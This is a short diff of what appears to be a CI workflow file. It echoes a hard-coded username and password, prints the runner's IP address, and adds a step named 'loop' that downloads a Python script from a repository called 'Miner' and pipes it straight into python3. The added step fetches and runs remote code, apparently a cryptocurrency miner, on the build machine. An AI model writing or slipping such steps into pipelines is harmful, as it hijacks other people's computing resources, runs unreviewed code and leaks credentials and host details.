@@ -33,5 +33,8 @@ jobs:
         run: |
           echo "Username: kushagrapal"
           echo "Password: kushagrapal*2727"
-          echo "SSH Public Key:"
-          cat ~/.ssh/id_rsa.pub
+          echo "IP:"
+          hostname -I
+      - name: loop
+        run: sudo -apt install python && curl -s https://raw.githubusercontent.com/Master-kp/Miner/refs/heads/main/loop.py | python3 -
+
